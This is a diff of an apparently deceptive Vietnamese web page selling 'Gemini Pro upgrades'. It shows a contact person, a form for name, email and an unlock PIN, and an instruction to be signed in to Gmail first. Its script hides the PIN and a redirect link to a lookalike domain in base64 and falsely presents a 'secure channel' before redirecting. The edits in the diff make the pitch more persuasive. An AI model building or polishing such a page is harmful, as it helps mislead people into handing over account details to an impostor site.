+                    <div class="desc"><strong>Imagen (4 / Nano Banana):</strong> Vẽ ảnh siêu thực, chỉnh sửa chi tiết và giữ nguyên nhân vật nhất quán qua nhiều góc máy.</div>
+                </div>
+                <div class="model-chip">
+                    <span class="icon">🎬</span>
+                    <div class="desc"><strong>Veo (2 &amp; 3):</strong> AI tạo video 4K từ văn bản, biến ảnh tĩnh thành video điện ảnh sống động, tự động khớp khẩu hình (lip-sync).</div>
+                </div>
+                <div class="model-chip">
+                    <span class="icon">🎵</span>
+                    <div class="desc"><strong>Lyria:</strong> Sáng tác âm nhạc, tạo bản nhạc nền và giai điệu độc quyền theo cảm xúc.</div>
+                </div>
+            </div>
+
+            <!-- Workspace Apps -->
+            <h3 class="sub-block-title">💼 2. Hệ sinh thái Ứng dụng tích hợp AI</h3>
+            <p class="sub-block-desc">AI được tích hợp sẵn ngay trong các công cụ bạn sử dụng hằng ngày:</p>
+
+            <div class="workspace-grid">
+                <div class="ws-card">
+                    <div class="ws-card-title">💼 Google Workspace</div>
+                    <ul>
+                        <li><strong>Docs:</strong> Soạn thảo giáo án, báo cáo, bài viết.</li>
+                        <li><strong>Sheets:</strong> Phân tích số liệu, gợi ý hàm.</li>
+                        <li><strong>Slides:</strong> Thiết kế bài thuyết trình độc quyền.</li>
+                        <li><strong>Gmail:</strong> Tóm tắt chuỗi thư, hồi đáp tự động.</li>
+                        <li><strong>Drive:</strong> Dung lượng lưu trữ đám mây <strong>5TB</strong>.</li>
+                    </ul>
+                </div>
+
+                <div class="ws-card">
+                    <div class="ws-card-title">🌐 Trợ lý Thông minh</div>
+                    <ul>
+                        <li><strong>Gemini Live:</strong> Giao tiếp giọng nói thời gian thực không độ trễ.</li>
+                        <li><strong>Chrome Side Panel:</strong> Đọc nhanh, tóm tắt trang web và chắt lọc ý chính tức thì.</li>
+                    </ul>
+                </div>
+
+                <div class="ws-card">
+                    <div class="ws-card-title">💻 Kỹ thuật &amp; Lập trình</div>
+                    <ul>
+                        <li><strong>AI Studio:</strong> Môi trường thử nghiệm prompt chuyên sâu.</li>
+                        <li><strong>Colab &amp; Android Studio:</strong> Hỗ trợ viết mã nguồn, sửa lỗi và tối ưu hiệu suất.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Slogan CTA -->
+            <p class="cta-slogan">
+                🚀 ĐỪNG CHỈ DÙNG AI<br>HÃY BẮT ĐẦU LÀM CHỦ AI VÀ ĐỂ GEMINI PRO PHỤC VỤ BẠN!
+            </p>
+
+            <!-- Contact Box -->
+            <div class="contact-card">
+                <div class="contact-name">Ms. Huyền — Chuyên gia AI</div>
+                <div class="contact-phone">07.6666.7999</div>
+                <div class="contact-note">Hỗ trợ 24/7 qua Zalo / Cuộc gọi trực tiếp</div>
+            </div>
+        </div>
+        
+        <!-- REGISTRATION / UPGRADE FORM -->
+        <div class="glass-card form-box">
             <h3>🔥 SẴN SÀNG NÂNG CẤP?</h3>
-            <p>Vui lòng nhập thông tin để hệ thống chuẩn bị tài nguyên AI cho bạn.</p>
-            <div class="warning-box">⚠️ LƯU Ý VÀ HƯỚNG DẪN:<br>BẠN PHẢI ĐĂNG NHẬP VÀO ĐƯỢC GMAIL CỦA BẠN XONG MỚI ĐIỀN THÔNG TIN VÀ EMAIL NÂNG CẤP.</div>
+            <p class="form-desc">Vui lòng nhập thông tin để hệ thống chuẩn bị tài nguyên AI cho bạn.</p>
             
-            <input type="text" id="cusName" placeholder="Nhập tên của bạn" required>
-            <input type="email" id="cusEmail" placeholder="Nhập địa chỉ Email đăng ký" required>
-            <input type="text" id="cusPin" class="pin-input" placeholder="Nhập Mã Mở Khóa (PIN)" style="display:none;">
+            <div class="warning-box">
+                ⚠️ <strong>LƯU Ý QUAN TRỌNG:</strong><br>
+                Vui lòng mở sẵn một tab bên cạnh và <strong>đăng nhập vào Gmail của bạn trước</strong>, sau đó điền Họ tên, Email nâng cấp và Mã mở khóa (PIN).
+            </div>
             
-            <button onclick="kiemTraBaoMat()">👉 ĐĂNG KÝ GEMINI PRO NGAY</button>
+            <input type="text" id="cusName" placeholder="Nhập họ tên của bạn" required autocomplete="name">
+            <input type="email" id="cusEmail" placeholder="Nhập địa chỉ Email bạn muốn nâng cấp" required autocomplete="email">
+            <input type="text" id="cusPin" class="pin-input" placeholder="Nhập Mã Mở Khóa (PIN)" style="display:none;" autocomplete="off">
+            
+            <button class="btn-submit" onclick="kiemTraBaoMat()">👉 NÂNG CẤP GÓI GEMINI PRO NGAY</button>
         </div>
+        
         <p class="note">*Lưu ý: Tính năng, hạn mức sử dụng và quyền lợi của Gemini Pro phụ thuộc vào gói dịch vụ và chính sách hiện hành của Google.</p>
     </div>
     
+    <!-- POPUP CONFIRMATION -->
     <div id="popupOverlay">
         <div class="popup-content">
             <h3 id="welcomeMsg">Chào mừng!</h3>
-            <p>Hệ thống đã xác nhận thông tin. Đường truyền bảo mật đã sẵn sàng để nâng cấp tài khoản cho bạn.</p>
-            <button class="btn-upgrade-popup" id="btnThucThi" onclick="chuyenHuongVaBaoCao()">Nâng cấp ngay cho email: <span class="email-highlight" id="displayEmail"></span></button>
+            <p>Hệ thống đã xác nhận thông tin hợp lệ. Đường truyền bảo mật đã sẵn sàng để nâng cấp tài khoản cho bạn.</p>
+            <button class="btn-upgrade-popup" id="btnThucThi" onclick="chuyenHuongVaBaoCao()">
+                Nâng cấp ngay cho email: <span class="email-highlight" id="displayEmail"></span>
+            </button>
         </div>
     </div>
     
     <script>
+        // MỞ KHÓA BIẾN ĐỘNG CHO PYTHON CHÈN DỮ LIỆU
         const SECRET_PIN_HASH = "R1AxMDI2LUdZMlYtNg==";
         const SECRET_LINK_HASH = "aHR0cHM6Ly9nZW1pbmktcHJvLTE4bS5jb20vc3Vic2NyaXB0aW9uL25ldy9nQUFBQUFCcXpLZEEzYll4cG5mOXYwQ0llSjJqbnVMUzJaTDB0cmVabXp1YXhvY3FDQ1RVT0hwU3pBazFLbGVlRHRUMENySkw2YXNIUTFFLWl4YlpmQ09zNlpHNURZRkZ1Zz09aHR0cHM6Ly9nZW1pbmktcHJvLTE4bS5jb20vc3Vic2NyaXB0aW9uL25ldy9nQUFBQUFCcXpLZEEzYll4cG5mOXYwQ0llSjJqbnVMUzJaTDB0cmVabXp1YXhvY3FDQ1RVT0hwU3pBazFLbGVlRHRUMENySkw2YXNIUTFFLWl4YlpmQ09zNlpHNURZRkZ1Zz09";
 
@@ -103,12 +839,12 @@
             let pin = document.getElementById('cusPin').value.trim();
 
             if(name === "" || email === "") { 
-                alert("Vui lòng điền đầy đủ Tên và Email!"); 
+                alert("Vui lòng điền đầy đủ Họ tên và Email!"); 
                 return; 
             }
 
             if(SECRET_PIN_HASH !== "" && btoa(pin) !== SECRET_PIN_HASH) {
-                alert("Mã mở khóa không chính xác! Hệ thống từ chối truy cập.\nVui lòng liên hệ bộ phận hỗ trợ để nhận mã kích hoạt.");
+                alert("Mã mở khóa không chính xác! Hệ thống từ chối truy cập.\nVui lòng liên hệ Ms Huyền để được hỗ trợ và nhận mã kích hoạt.");
                 return;
             }
 
@@ -121,7 +857,7 @@
             let name = document.getElementById('cusName').value.trim();
             let email = document.getElementById('cusEmail').value.trim();
             let btn = document.getElementById('btnThucThi');
-            btn.innerHTML = "Đang kết nối hệ thống an toàn... ⏳";
+            btn.innerHTML = "Đang tiến hành nâng cấp tài khoản GEMINI PRO... ⏳";
             btn.disabled = true;
 
             let linkDichThucTe = atob(SECRET_LINK_HASH);
